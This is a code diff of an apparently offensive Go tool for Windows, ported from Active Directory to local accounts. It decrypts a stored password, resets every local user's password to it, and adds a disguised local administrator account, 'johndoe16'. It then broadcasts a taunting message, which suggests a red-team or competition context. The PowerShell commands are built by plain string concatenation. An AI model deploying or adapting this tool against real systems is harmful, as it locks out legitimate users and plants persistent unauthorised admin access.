@@ -1,4 +1,4 @@
-//go:build windows && ad
+//go:build windows && !ad
 
 package main
 
@@ -40,35 +40,6 @@ func RunningAsAdmin() bool {
 
 	return elevation.TokenIsElevated != 0
 }
-
-// Low level crap directly loading calls to NTAPI
-// [Commented due to bugs]
-//func DomainJoined() bool {
-//	var (
-//		netapi32                  = syscall.NewLazyDLL("Netapi32.dll")
-//		procNetGetJoinInformation = netapi32.NewProc("NetGetJoinInformation")
-//		buffer                    uintptr
-//		_                         uint32
-//		joinStatus                uintptr
-//	)
-//
-//	// Call NetGetJoinInformation, null for local computer
-//	ret, _, _ := procNetGetJoinInformation.Call(
-//		uintptr(unsafe.Pointer(nil)),
-//		uintptr(unsafe.Pointer(&buffer)),
-//		uintptr(unsafe.Pointer(&joinStatus)),
-//	)
-//
-//	// Assuming success and simplifying; real code needs error checking!
-//	if ret == 0 {
-//		// Interpret joinStatus; 1 typically indicates a domain-joined machine.
-//		// Cleanup omitted for brevity; you'd call NetApiBufferFree here.
-//		return joinStatus == 1
-//	}
-//
-//	// Default to not joined if the call failed or machine is not domain-joined
-//	return false
-//}
 
 func main() {
 
@@ -117,15 +88,20 @@ func main() {
 		DecryptedBytes, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, &MasterConfig.Protector, blob, nil)
 		password := strings.TrimSpace(string(DecryptedBytes)) // convert raw bytes to string
 
-		// Get all AD users
-		users, err := ExecPowerShell(`Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName`)
+		// Get all Local users
+		users, err := ExecPowerShell(`Get-LocalUser | Select-Object -ExpandProperty Name`)
 		handle(err)
 
 		// Recursively change each user's password
 		for _, user := range strings.Split(users, "\n") {
 			user = strings.TrimSpace(user)
-			if user == "" {
+
+			// basic check to ignore system accounts
+			switch user {
+			case "", "DefaultAccount", "WDAGUtilityAccount":
 				continue
+			default:
+				break
 			}
 
 			// WaitGroups enable us to tell the program to wait
@@ -135,14 +111,8 @@ func main() {
 			go func(u string, p string) {
 				defer wg.Done()
 
-				// Change the password
-				_, err = ExecPowerShell(`Set-ADAccountPassword -Identity "` + u + `" -NewPassword (ConvertTo-SecureString -AsPlainText "` + p + `" -Force)`)
+				_, err = ExecPowerShell(`Set-LocalUser -Name "` + u + `" -Password (ConvertTo-SecureString "` + p + `" -AsPlainText -Force)`)
 				handle(err)
-
-				// Ensure the account is enabled
-				_, err = ExecPowerShell(`Enable-ADAccount -Identity "` + u + `"`)
-				handle(err)
-
 			}(user, password)
 		}
 
@@ -150,8 +120,8 @@ func main() {
 		// Finished changing passwords
 
 		// Add one more local admin user just in case
-		ExecPowerShell(`New-ADUser -Name "johndoe19" -AccountPassword (ConvertTo-SecureString "` + password + `" -AsPlainText -Force) -Enabled $true -GivenName "John" -Surname "Doe" -DisplayName "John Doe" -Description "System"`)
-		ExecPowerShell(`Add-ADGroupMember -Identity "Domain Admins" -Member "johndoe19"`)
+		ExecPowerShell(`New-LocalUser "johndoe16" -Password (ConvertTo-SecureString "` + password + `" -AsPlainText -Force) -FullName "System" -Description "Local User Account"`)
+		ExecPowerShell(`Add-LocalGroupMember -Group "Administrators" -Member "johndoe16"`)
 
 		// :trollskull:
 		WindowsBroadcast("You really thought you won, huh?")
